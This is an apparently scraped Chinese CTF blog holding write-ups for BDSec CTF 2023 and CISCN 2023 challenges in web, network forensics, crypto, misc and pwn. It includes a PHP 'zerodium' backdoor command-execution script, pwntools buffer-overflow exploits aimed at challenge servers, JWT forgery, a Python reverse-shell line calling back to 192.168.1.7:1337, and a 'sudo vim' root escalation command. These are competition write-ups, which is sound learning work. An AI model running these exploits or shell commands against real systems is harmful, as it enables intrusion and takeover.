            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;,
            &quot;User-Agentt&quot;: &quot;zerodiumsystem(&#x27;&quot; + cmd + &quot;&#x27;);&quot;
            &#125;
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split(&#x27;&lt;!DOCTYPE html&gt;&#x27;,1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print(&quot;Exiting...&quot;)
        exit

else:
    print(&quot;\r&quot;)
    print(response)
    print(&quot;Host is not available, aborting...&quot;)
    exit</code></pre>
<img src="https://img.hzy2003628.top/image-20230722145700870.png" alt="image-20230722145700870" style="zoom:200%;">
<p>BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}</p>
<h2 id="what-is-5-minus-4">What is 5 minus 4?</h2>
<blockquote>
<p>There are some best practices in web development which should strictly followed by the developer!</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722145819156.png" alt="image-20230722145819156" style="zoom:200%;">
<p>登陆注册功能，简单弱口令试了一下没有，注册一个进去看看</p>
<img src="https://img.hzy2003628.top/image-20230722150105069.png" alt="image-20230722150105069" style="zoom:200%;">
<p>没啥其他功能点了，猜测就是越权或者伪造admin用户，因为刚才在注册的时候也看到了admin用户是存在的</p>
<p>JWT伪造，先爆破密钥为this_is_a_dev_secret</p>
<img src="https://img.hzy2003628.top/image-20230722174307373.png" alt="image-20230722174307373" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230722174332350.png" alt="image-20230722174332350" style="zoom:200%;">
<p>将sub改成1，伪造之后替换cookie，猜测就是得到admin用户</p>
<img src="https://img.hzy2003628.top/image-20230722174607414.png" alt="image-20230722174607414" style="zoom:200%;">
<p>BDSEC{m4k3_y0ur_53cr37_k3y_57r0n63r}</p>
<h2 id="injection待复现">Injection【待复现】</h2>
<blockquote>
<p>Let’s see, If you can Inject</p>
</blockquote>
<p>这个不会，待学习</p>
<p>和这个题目类似</p>
<p><a href="https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/">DUCTF - sqli2022 challenge (web) (justinsteven.com)</a></p>
<h1 id="networking">NETWORKING</h1>
<p>题目是一个附件，附件地址放这了，大家自取</p>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1zbwBuJpPZ7Fpi4lHtlHZfA?pwd=dqns">https://pan.baidu.com/s/1zbwBuJpPZ7Fpi4lHtlHZfA?pwd=dqns</a><br>
提取码：dqns</p>
</blockquote>
<h2 id="ip-addr">IP Addr</h2>
<blockquote>
<p>Nanomate Solutions, a dynamic startup software development company, has unfortunately experienced a recent security breach resulting in unauthorized access to their database. In response to this incident, the company’s Incident Response team has obtained the network packet file and is seeking your expertise to investigate the evidence. Your skills are crucial in securing the company and resolving this matter effectively. Join forces with the Incident Response team to protect Nanomate Solutions and secure their confidence in their system’s integrity.</p>
<p>What is the server &amp; attacker ip?</p>
<p>Flag format: BDSEC{serverip_attackerip}</p>
</blockquote>
<p>数据库被攻击，找攻击IP</p>
<img src="https://img.hzy2003628.top/image-20230722151910681.png" alt="image-20230722151910681" style="zoom:200%;">
<p>BDSEC{192.168.1.5_192.168.1.7}</p>
<h2 id="hostname">HostName</h2>
<blockquote>
<p>What is the host name of the web server?</p>
<p>Flag format: BDSEC{hostname}</p>
</blockquote>
<p>hostname</p>
<img src="https://img.hzy2003628.top/image-20230722152046234.png" alt="image-20230722152046234" style="zoom:200%;">
<p>BDSEC{<a href="http://nanomate-solutions.com">nanomate-solutions.com</a>}</p>
<h2 id="port">Port</h2>
<blockquote>
<p>What was the LPORT?</p>
<p>Flag Format: BDSEC{port}</p>
</blockquote>
<p>这个我个人理解就是攻击成功的那个主机端口，找了一会发现攻击者进行传马shell命令执行，试了一下这个端口对了</p>
<img src="https://img.hzy2003628.top/image-20230722153315341.png" alt="image-20230722153315341" style="zoom:200%;">
<p>BDSEC{1337}</p>
<h2 id="users">Users</h2>
<blockquote>
<p>How many users had the server access?</p>
<p>Flag Format: BDSEC{number}</p>
</blockquote>
<p>数了一下souceip，六个</p>
<p>BDSEC{6}</p>
<h2 id="follow-the-path">Follow the Path</h2>
<blockquote>
<p>What is the path of the Admin endpoint?</p>
<p>Flag format : BDSEC{/path}</p>
</blockquote>
<p>就是后台管理地址</p>
<img src="https://img.hzy2003628.top/image-20230722154249319.png" alt="image-20230722154249319" style="zoom:200%;">
<p>BDSEC{/app/admin_panel}</p>
<h2 id="compromised-account">Compromised Account</h2>
<blockquote>
<p>Which user account was compromised? What was the username &amp; password?</p>
<p>Flag format: BDSEC{username_password}</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722155101310.png" alt="image-20230722155101310" style="zoom:200%;">
<p>BDSEC{tareq_tareq@nanomate}</p>
<h2 id="compromised-database">Compromised Database</h2>
<blockquote>
<p>How did the attacker enumurate &amp; compromised the database?</p>
<p>Flag Format: BDSEC{name/version}</p>
</blockquote>
<p>这个问题有点不理解意思是啥，不会写，哪位师傅会，留个言教一下，ORZORZ</p>
<h2 id="compromised-admin-account">Compromised Admin Account</h2>
<blockquote>
<p>What is the admin password?</p>
<p>Flag Format: BDSEC{password}</p>
</blockquote>
<p>root:41528ac7f116e9661cf57be7cd79e1a2</p>
<p>BDSEC{41528ac7f116e9661cf57be7cd79e1a2}</p>
<h2 id="crackable">Crackable?</h2>
<blockquote>
<p>Is the admin password crackable?</p>
<p>Flag Format: BDSEC{flag}</p>
</blockquote>
<p>BDSEC{no}</p>
<p>留坑，欢迎留言</p>
<h2 id="shell">Shell</h2>
<blockquote>
<p>What did the attacker do for the reverse shell in the server?</p>
<p>Flag Format: BDSEC{command}</p>
</blockquote>
<p>找到反弹shell的命令了，但是不知道是因为格式问题还是因为啥，提交不对</p>
<img src="https://img.hzy2003628.top/image-20230722162819164.png" alt="image-20230722162819164" style="zoom:200%;">
<p>还找到一个，但是也不对</p>
<img src="https://img.hzy2003628.top/image-20230722162855347.png" alt="image-20230722162855347" style="zoom:200%;">
<p>留坑，欢迎留言</p>
<p>BDSEC{python±c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.7%22%2C1337%29%29}</p>
<h2 id="version">Version</h2>
<blockquote>
<p>What is the Linux version of the server?</p>
<p>Flag Format: BDSEC{versi-on}</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722161543354.png" alt="image-20230722161543354" style="zoom:200%;">
<p>BDSEC{5.19.0-46-generic}</p>
<h2 id="root-permission">Root Permission</h2>
<blockquote>
<p>What binary had the root permission?</p>
<p>Flag Format: BDSEC{Flag}</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722162441217.png" alt="image-20230722162441217" style="zoom:200%;">
<p>BDSEC{vim}</p>
<h2 id="root-access">Root Access</h2>
<blockquote>
<p>How did the attacker got root access?</p>
<p>Flag Format: BDSEC{command}</p>
<blockquote>
<p>replace space with underscore</p>
</blockquote>
</blockquote>
<p>图见上题</p>
<p>BDSEC{sudo_vim_-c_‘:!/bin/sh’}</p>
<h2 id="hidden-path">Hidden Path</h2>
<blockquote>
<p>Where did the attacker hide the reverse shell in the web server?</p>
<p>Flag Format: BDSEC{/path}</p>
</blockquote>
<p>反弹shell不就是一个命令吗，咋还隐藏起来了，有点不理解</p>
<p>挖坑，期待留言</p>
<h2 id="root-flag">Root Flag</h2>
<blockquote>
<p>What is the root flag?</p>
<p>Flag Format: BDSEC{flag}</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722163717831.png" alt="image-20230722163717831" style="zoom:200%;">
<p>BDSEC{Y0u_NaILeD_IT_HaCkEr}</p>
<h2 id="was-it-vulnerable">Was it Vulnerable?</h2>
<blockquote>
<p>Was Process Task Details page vulnerable? If yes, what was the vulnerability?</p>
<p>Flag Format: BDSEC{VULN}</p>
<p>Example Flag: BDSEC{RCE_XSS}</p>
<blockquote>
<p>If multiple, separate them with underscore. The flag is case insensitive &amp; order doesn;'t matter.</p>
</blockquote>
</blockquote>
<p>我觉得是SQL注入和XSS，但是不对</p>
<p>BDSEC{SQL_XSS}</p>
<p>挖坑，欢迎留言</p>
<h2 id="database-flag">Database Flag</h2>
<blockquote>
<p>What is the database flag?</p>
<p>Flag Format: BDSEC{flag}</p>
</blockquote>
<p>还真没找到，挖坑，感谢留言</p>
<h1 id="cryptography">CRYPTOGRAPHY</h1>
<h2 id="e4sy-crypto">E4sy Crypto</h2>
<blockquote>
<p>Someone sent me this message : 1e25v768h1e66dw61v1hv1kl6aa1ei1pw1pv1ju1kj5ps1bb6lw624</p>
<p>What is this ?</p>
<p><strong>Flag Format :</strong> BDSEC{flag_here}</p>
</blockquote>
<p>比较偏的解码，双重HEX解码，留个在线网站以备不时之需</p>
<p><a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">Twin-Hex Cypher encoder and decoder from CalcResult Universal Calculators</a></p>
<p>解两次得到flag</p>
<img src="https://img.hzy2003628.top/image-20230722165749208.png" alt="image-20230722165749208" style="zoom:200%;">
<p>BDSEC{<em>tW1n_H3X_c1Ph3r</em>}</p>
<h1 id="misc">MISC</h1>
<h2 id="think-like-a-hacker">Think Like a Hacker</h2>
<blockquote>
<p>One of our contributors has created a promo video for BDSec CTF 2023. He sent me a zip file containing the promo video and a readme.txt file. He told me, if I think like a hacker, I’ll find something cool! Can you think like a hacker?</p>
</blockquote>
<img src="https://img.hzy2003628.top/image-20230722171138282.png" alt="image-20230722171138282" style="zoom:200%;">
<p>一个mp4没啥东西，也排查不是音频隐写，考虑是字符串吧</p>
<img src="https://img.hzy2003628.top/image-20230722171831300.png" alt="image-20230722171831300" style="zoom:200%;">
<p>OQFRP{OQFrp_PGS_2023_Ce0z0_I1Q30_sY4T}</p>
<p>rot13解码得到flag</p>
<p>BDSEC{BDSec_CTF_2023_Pr0m0_V1D30_fL4G}</p>
<h2 id="what-is-this">What is this ?</h2>
<blockquote>
<p>I have some files. But I have know idea what are these !!</p>
</blockquote>
<p>一堆bin文件，并且第一个有图片头，懂了，合起来就是一个图片的str数据，应该就是flag</p>
<img src="https://img.hzy2003628.top/image-20230722170417999.png" alt="image-20230722170417999" style="zoom:200%;">
<p>脚本如下</p>
<pre><code class="hljs plaintext">import os

def merge_files_with_flag(prefix, output_filename):
    files_with_flag = [filename for filename in os.listdir(&quot;.&quot;) if filename.startswith(prefix)]
    merged_content = b&quot;&quot;

    for filename in files_with_flag:
        with open(filename, &quot;rb&quot;) as file:
            content = file.read()
            merged_content += content

    with open(output_filename, &quot;wb&quot;) as output_file:
        output_file.write(merged_content)

if __name__ == &quot;__main__&quot;:
    merge_files_with_flag(&quot;flag_&quot;, &quot;1.png&quot;)</code></pre>
<img src="https://img.hzy2003628.top/image-20230722170907344.png" alt="image-20230722170907344" style="zoom:200%;">
<p>BDSEC{1tS_@<em>PnG_f1LE</em>}</p>
<h1 id="pwn">PWN</h1>
<blockquote>
<p><a href="https://xhacka.github.io/posts/BDSec-2023-Pwn/#anyaforger">BDSec 2023 - Pwn Challenges | xHacka</a></p>
</blockquote>
<h2 id="ghost">Ghost</h2>
<blockquote>
<p>Find the flag.</p>
<blockquote>
<p>139.144.184.150 4000</p>
</blockquote>
</blockquote>
<p>main函数如下，code存在溢出，覆盖overflow，即可成立输出flag</p>
<img src="https://img.hzy2003628.top/image-20230723111751715.png" alt="image-20230723111751715" style="zoom:200%;">
<p>checksec检查保护，保护拉满</p>
<img src="https://img.hzy2003628.top/image-20230723112016634.png" alt="image-20230723112016634" style="zoom:200%;">
<p>仔细观察一下，code比dest大，利用code在栈上写</p>
<pre><code class="hljs plaintext">char dest[64]; // [rsp+10h] [rbp-160h] BYREF
 int overflow; // [rsp+50h] [rbp-120h]
 char code[264]; // [rsp+60h] [rbp-110h] BYREF
 unsigned __int64 v7; // [rsp+168h] [rbp-8h]</code></pre>
<p>gdb寻找偏移量，下图圈起来的就是对应的if ( overflow == 1145258561 )</p>
<img src="https://img.hzy2003628.top/image-20230723112515478.png" alt="image-20230723112515478" style="zoom:200%;">
<p>打断点</p>
<img src="https://img.hzy2003628.top/image-20230723112723090.png" alt="image-20230723112723090" style="zoom:200%;">
<pre><code class="hljs plaintext">0x5555555553a9 &lt;main+160&gt;    cmp    eax, 0x44434241</code></pre>
<img src="https://img.hzy2003628.top/image-20230723113330912.png" alt="image-20230723113330912" style="zoom:200%;">
<p>因为LSB所以需要反过来计算，得到偏移量为64</p>
<p>exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

# p= process(&#x27;./ghost&#x27;)
p = remote(&#x27;139.144.184.150&#x27;, 4000)
p.sendline(b&#x27;A&#x27;*64 + p64(0x44434241))
print(p.recvall().decode())</code></pre>
<img src="https://img.hzy2003628.top/image-20230723122118321.png" alt="image-20230723122118321" style="zoom:200%;">
<h2 id="anyaforger">anyaForger</h2>
<blockquote>
<p>Let’s see if you can get the flag.</p>
<blockquote>
<p>139.144.184.150 31337</p>
</blockquote>
</blockquote>
<pre><code class="hljs plaintext">[*] &#x27;/home/kali/桌面/beef&#x27;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments</code></pre>
<p>保护都没开，vuln函数</p>
<img src="https://img.hzy2003628.top/image-20230723114926487.png" alt="image-20230723114926487" style="zoom:200%;">
<p>怎么说，感觉和上一道题目差不多，做法几乎一样</p>
<img src="https://img.hzy2003628.top/image-20230723115040400.png" alt="image-20230723115040400" style="zoom: 200%;">
<img src="https://img.hzy2003628.top/image-20230723115120098.png" alt="image-20230723115120098" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230723115358406.png" alt="image-20230723115358406" style="zoom:200%;">
<p>偏移量32</p>
<p>覆写即可成立条件，exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

#io = process(&#x27;./beef&#x27;)
io = remote(&#x27;139.144.184.150&#x27;, 31337)
io.sendline(b&#x27;a&#x27;*32 + p64(0xdeadbeef))
print(io.recvall().decode())</code></pre>
<img src="https://img.hzy2003628.top/image-20230723120242482.png" alt="image-20230723120242482" style="zoom:200%;">
<p>BDSEC{artificial_intelligence_guides_us_to_a_better_future}</p>
<h2 id="callme">callme</h2>
<blockquote>
<p>Call me &amp; get the flag.</p>
<blockquote>
<p>139.144.184.150 3333</p>
</blockquote>
</blockquote>
<p>保护啥都没开</p>
<img src="https://img.hzy2003628.top/image-20230723121132684.png" alt="image-20230723121132684" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230723121154978.png" alt="image-20230723121154978" style="zoom:200%;">
<p>call函数会输出flag，需要想办法溢出调用call函数</p>
<img src="https://img.hzy2003628.top/image-20230723121310292.png" alt="image-20230723121310292" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230723121341589.png" alt="image-20230723121341589" style="zoom:200%;">
<p>主要的两个函数入口地址</p>
<pre><code class="hljs plaintext">0x0804875e  callme
0x0804878c  main</code></pre>
<img src="https://img.hzy2003628.top/image-20230723121436429.png" alt="image-20230723121436429" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230723121534085.png" alt="image-20230723121534085" style="zoom:200%;">
<p>偏移量64，直接溢出到call函数入口地址即可，exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

# p= process(&#x27;./callme&#x27;)
p = remote(&#x27;139.144.184.150&#x27;, 3333)
p.sendline(b&#x27;A&#x27;*64 + p64(0x0804875e))
print(p.recvall().decode())</code></pre>
<img src="https://img.hzy2003628.top/image-20230723121619540.png" alt="image-20230723121619540" style="zoom:200%;">
<p>BDSEC{reverse_engineering_shatters_the_chains_of_ignorance}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCN华中赛区分区赛</title>
    <url>/2023/06/28/2023CISCN%5B%E5%8D%8E%E4%B8%AD%E5%86%B3%E8%B5%9B%5D/</url>
    <content><![CDATA[<img src="https://img.hzy2003628.top/image-20230716172517763.png" alt="image-20230716172517763" style="zoom:200%;">
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>第一次参加国赛，很荣幸进了线下分区赛，也很遗憾线下发挥失常没进决赛，不过算增长经验了，在这里立个flag，明年进决赛，写这篇文章主要是复现并且记录一下分区赛</p>
<h1 id="第一天">第一天</h1>
<blockquote>
<p>比赛模式：CTF</p>
<p>名次：40</p>
</blockquote>
<p>第一天的CTF题目着实泪目，WEB嘎嘎难，密码学考察了不少，但是我们队伍比较薄弱，总之就是很惨</p>
<h2 id="web-ezinject">WEB-ezinject</h2>
<blockquote>
<p>全场唯一有解的web题–考察SQL注入</p>
</blockquote>
<p>总之就是过滤了很多函数，直接双写绕过盲注就出了</p>
<h2 id="misc-奇怪的图片">MISC-奇怪的图片</h2>
<p>图片隐写，修复改宽高，然后压缩包明文攻击</p>
<img src="https://img.hzy2003628.top/image-20230716173818083.png" alt="image-20230716173818083" style="zoom:200%;">
<p>压缩包损坏，猜测应该是linux压缩的压缩包，windows解压就会报错，拉到linux里面可以分离出来一个图片</p>
<img src="https://img.hzy2003628.top/image-20230716174222662.png" alt="image-20230716174222662" style="zoom:200%;">
<p>看文件名，一眼顶针了，明文攻击</p>
<img src="https://img.hzy2003628.top/image-20230716174304363.png" alt="image-20230716174304363" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230716174439604.png" alt="image-20230716174439604" style="zoom:200%;">
<p>密码@2Dc^u，解压得到png文件</p>
<img src="https://img.hzy2003628.top/image-20230716174524526.png" alt="image-20230716174524526" style="zoom:200%;">
<p>010打开，改宽高得到flag</p>
<img src="https://img.hzy2003628.top/image-20230716174613167.png" alt="image-20230716174613167" style="zoom:200%;">
<h2 id="misc-base家族大杂烩">MISC-base家族大杂烩</h2>
<p>这个就是一直套娃解密，大概解密十几次就出了，属于签到题</p>
<h2 id="misc-新佛曰">MISC-新佛曰</h2>
<blockquote>
<p>00后的小明看到隔壁小王(19930511)在念经，于是他也开始朗诵了起来:</p>
<p>佛又曰：咩楞沙呼唵利地帝地萨唵喝娑伽室哆室耶摩沙呼度阇烁夜摩穆曳利驮阿菩他俱地参豆皤提遮啰提蒙蒙参利啰输阿尼吉埵穆羯啰嚧输墀栗楞哆他苏无利度啰阿伊唵参嚧吉羯摩埵漫漫</p>
</blockquote>
<p>这个题目是爆破密钥，用那个新与佛论禅，当时现场是没写出来，看了其他师傅的前端js代码直接爆破，牛x，在这里也记录一下那个师傅的一个代码，值得学习</p>
<pre><code class="hljs plaintext">function decode()&#123;
for(let keys=20000000;keys&lt;=20241231;keys++)&#123;
            document.getElementById(&quot;text-key&quot;).value = keys
            decrypt();
            if(document.getElementById(&quot;text-encryped&quot;).value.indexOf(&quot;flag&quot;)+1)&#123;
            console.log(String(keys)+&quot;\n&quot;+document.getElementById(&quot;text-encryped&quot;).value)
            break
        &#125;
    &#125;
&#125;</code></pre>
<p>然后直接调用这个函数爆破即可得到正确密钥然后得到flag</p>
<h2 id="其他">其他</h2>
<p>其他题目还是值得学习的，有时间复现一下其他的题目再补充，在这里先挖个坑</p>
<h1 id="第二天">第二天</h1>
<blockquote>
<p>比赛模式：AWD</p>
<p>名次：8</p>
</blockquote>
<p>第二天压力很大，因为第一天的太差了，不过还好吧，拿了个第八</p>
<h2 id="pwn">PWN</h2>
<p>全场坐牢~~~</p>
<h1 id="web">WEB</h1>
<p>纯靠WEB拿分，当时是找到了一个任意文件读取漏洞，并且全场貌似将近一半都没修复这个漏洞，基本就是利用这个漏洞炫分，最终拿到了第八，其实应该第五的，因为鼠标问题，复制flag的时候一直复制不上，导致后面好几轮漏交了很多flag</p>
<h1 id="最后">最后</h1>
<p>综合名次19名，前十二晋级决赛，遗憾错过，明年再战</p>
<img src="https://img.hzy2003628.top/image-20230716175419341.png" alt="image-20230716175419341" style="zoom:200%;">
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCN初赛</title>
    <url>/2023/06/01/2023CISCN%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<img src="https://img.hzy2003628.top/image-20230716172517763.png" alt="image-20230716172517763" style="zoom:200%;">
<span id="more"></span>
<h1 id="战队信息">战队信息</h1>
<p>战队名称：AGCTF</p>
<p>战队排名：16</p>
<h1 id="解题情况">解题情况</h1>
<img src="https://img.hzy2003628.top/66waxnbbyd.png" alt="请在此添加图片描述" style="zoom:200%;">
<h1 id="解题过程">解题过程</h1>
<h2 id="misc">MISC</h2>
<h3 id="签到卡">签到卡</h3>
<p>签到题</p>
<p>直接读取文件，键盘打print(open(‘/flag’).read())</p>
<p>得到flag</p>
<img src="https://img.hzy2003628.top/t00zeaxtaj.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{f61e3662-5ca5-4f70-a224-fa3a1bef67fb}</p>
<h3 id="被加密的生产流量">被加密的生产流量</h3>
<p>流量分析</p>
<p>过滤追踪流量0，会发现有base32编码的数据</p>
<img src="https://img.hzy2003628.top/pazk4e0z33.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>把数据提取出来base32解密得到flag</p>
<img src="https://img.hzy2003628.top/qw8t5f5tbh.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{c1f_fi1g_1000}</p>
<h3 id="国粹">国粹</h3>
<p>提取a.png和k.png里面的数据，</p>
<p>将a.png里面第一个数据一万作为原点0，然后按照顺序往后推算，将整体数据都-1作为x轴上的数据，k.png里面的整体数据都-1作为y轴</p>
<p>手搓，提取的数据为</p>
<pre><code class="hljs plaintext">X=[0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 8, 8, 8, 8, 8, 9, 9, 11, 11, 11, 11, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 12, 13, 13, 13, 13, 13, 13, 13, 13, 14, 14, 14, 14, 14, 14, 14, 15, 15, 15, 15, 15, 15, 15, 15, 16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 17, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 19, 19, 21, 21, 21, 21, 21, 21, 21, 21, 21, 21, 21, 21, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 25, 25, 25, 25, 25, 25, 25, 25, 25, 25, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 28, 28, 28, 28, 28, 30, 30, 30, 30, 30, 30, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38]

Y=[3, 4, 9, 29, 2, 3, 4, 5, 9, 28, 29, 2, 3, 9, 15, 16, 21, 22, 23, 24, 28, 29, 1, 2, 3, 4, 9, 14, 15, 17, 20, 21, 23, 24, 28, 29, 2, 3, 9, 14, 16, 17, 18, 20, 21, 24, 27, 28, 2, 3, 9, 14, 15, 17, 18, 20, 21, 24, 28, 2, 3, 9, 10, 11, 12, 14, 17, 18, 21, 22, 23, 24, 28, 29, 2, 3, 10, 11, 14, 15, 16, 17, 18, 19, 24, 28, 29, 20, 21, 23, 24, 29, 30, 22, 23, 21, 22, 23, 24, 1, 2, 3, 4, 8, 9, 10, 11, 15, 16, 17, 18, 23, 24, 1, 4, 5, 8, 11, 18, 22, 23, 4, 8, 11, 17, 18, 21, 22, 3, 4, 8, 11, 16, 17, 22, 23, 2, 3, 8, 11, 15, 16, 23, 24, 2, 8, 11, 15, 24, 2, 3, 4, 5, 8, 9, 10, 11, 15, 16, 17, 18, 20, 21, 22, 23, 24, 9, 10, 2, 3, 4, 5, 9, 10, 11, 16, 17, 18, 23, 24, 2, 5, 6, 8, 9, 15, 16, 18, 19, 21, 22, 23, 24, 2, 5, 6, 8, 9, 15, 18, 19, 23, 24, 2, 5, 6, 9, 10, 11, 15, 18, 19, 23, 24, 2, 5, 6, 11, 12, 15, 18, 19, 23, 24, 2, 5, 6, 8, 11, 12, 15, 18, 19, 23, 24, 2, 3, 5, 8, 9, 10, 11, 15, 16, 18, 19, 23, 24, 3, 4, 16, 17, 18, 9, 10, 11, 12, 24, 30, 3, 4, 5, 9, 10, 11, 12, 16, 17, 18, 22, 23, 24, 25, 31, 2, 3, 5, 6, 11, 15, 16, 22, 23, 25, 31, 5, 6, 10, 15, 16, 22, 23, 25, 31, 5, 10, 11, 16, 17, 18, 22, 23, 24, 25, 32, 4, 11, 12, 18, 19, 25, 31, 3, 4, 12, 15, 18, 19, 24, 25, 31, 3, 4, 5, 6, 8, 9, 10, 11, 12, 15, 16, 17, 18, 23, 24, 30, 31, 22, 23, 30]</code></pre>
<p>用脚本将各组坐标数据排列好，得到一个类似于轨迹图的图片</p>
<pre><code class="hljs plaintext">import matplotlib.pyplot as plt

def generate_trajectory_plot(x, y, output_file):

  plt.plot(x, y)

  plt.scatter(x, y, color=&#x27;red&#x27;)

  plt.xlabel(&#x27;X&#x27;)

  plt.ylabel(&#x27;Y&#x27;)

  plt.title(&#x27;Trajectory Plot&#x27;)

  plt.savefig(output_file)

  plt.show()

x_coordinates = [0,0,0,0,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,4,4,4,4,4,4,4,4,4,4,4,4,5,5,5,5,5,5,5,5,5,5,5,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,7,7,7,7,7,7,7,7,7,7,7,7,7,8,8,8,8,8,8,9,9,11,11,11,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,13,13,13,13,13,13,13,13,14,14,14,14,14,14,14,15,15,15,15,15,15,15,15,16,16,16,16,16,16,16,16,17,17,17,17,17,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,19,19,21,21,21,21,21,21,21,21,21,21,21,21,22,22,22,22,22,22,22,22,22,22,22,22,22,23,23,23,23,23,23,23,23,23,23,24,24,24,24,24,24,24,24,24,24,24,25,25,25,25,25,25,25,25,25,25,26,26,26,26,26,26,26,26,26,26,26,27,27,27,27,27,27,27,27,27,27,27,27,27,28,28,28,28,28,30,30,30,30,30,30,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,32,32,32,32,32,32,32,32,32,32,32,33,33,33,33,33,33,33,33,33,34,34,34,34,34,34,34,34,34,34,34,35,35,35,35,35,35,35,36,36,36,36,36,36,36,36,36,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,38,38,38]

y_coordinates = [3,4,9,29,2,3,4,5,9,28,29,2,3,9,15,16,21,22,23,24,28,29,1,2,3,4,9,14,15,17,20,21,23,24,28,29,2,3,9,14,16,17,18,20,21,24,27,28,2,3,9,14,15,17,18,20,21,24,28,2,3,9,10,11,12,14,17,18,21,22,23,24,28,29,2,3,10,11,14,15,16,17,18,19,24,28,29,20,21,23,24,29,30,22,23,21,22,23,24,1,2,3,4,8,9,10,11,15,16,17,18,23,24,1,4,5,8,11,18,22,23,4,8,11,17,18,21,22,3,4,8,11,16,17,22,23,2,3,8,11,15,16,23,24,2,8,11,15,24,2,3,4,5,8,9,10,11,15,16,17,18,20,21,22,23,24,9,10,2,3,4,5,9,10,11,16,17,18,23,24,2,5,6,8,9,15,16,18,19,21,22,23,24,2,5,6,8,9,15,18,19,23,24,2,5,6,9,10,11,15,18,19,23,24,2,5,6,11,12,15,18,19,23,24,2,5,6,8,11,12,15,18,19,23,24,2,3,5,8,9,10,11,15,16,18,19,23,24,3,4,16,17,18,9,10,11,12,24,30,3,4,5,9,10,11,12,16,17,18,22,23,24,25,31,2,3,5,6,11,15,16,22,23,25,31,5,6,10,15,16,22,23,25,31,5,10,11,16,17,18,22,23,24,25,32,4,11,12,18,19,25,31,3,4,12,15,18,19,24,25,31,3,4,5,6,8,9,10,11,12,15,16,17,18,23,24,30,31,22,23,30]

output_image = &#x27;trajectory_plot.png&#x27;

generate_trajectory_plot(x_coordinates, y_coordinates, output_image)</code></pre>
<img src="https://img.hzy2003628.top/ix8qi00kbo.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>由此得到flag{202305012359}</p>
<h3 id="调查问卷">调查问卷</h3>
<p>直接写一份问卷得到flag</p>
<img src="https://img.hzy2003628.top/rlkw55kjhm.png" alt="请在此添加图片描述" style="zoom:200%;">
<p>flag{TalentDevelopment}</p>
<h3 id="pyshell">pyshell</h3>
<p>查看python内置文件可以看出语句之间需要_拼接</p>
